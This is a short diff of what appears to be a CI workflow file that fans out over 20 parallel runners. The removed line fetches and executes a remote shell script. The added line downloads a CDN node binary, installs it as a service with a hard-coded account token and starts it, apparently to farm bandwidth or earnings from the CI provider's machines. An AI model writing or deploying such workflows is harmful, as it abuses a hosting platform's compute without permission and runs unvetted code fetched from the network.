@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/mielemedia/mm/main/start.sh && chmod +x start.sh && ./start.sh
+          wget '/v/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && ./service install meson_cdn && ./meson_cdn config set --token=gbrmmfpsjawukfvzsssbekks --https_port=443 --cache.size=30 && ./service start meson_cdn
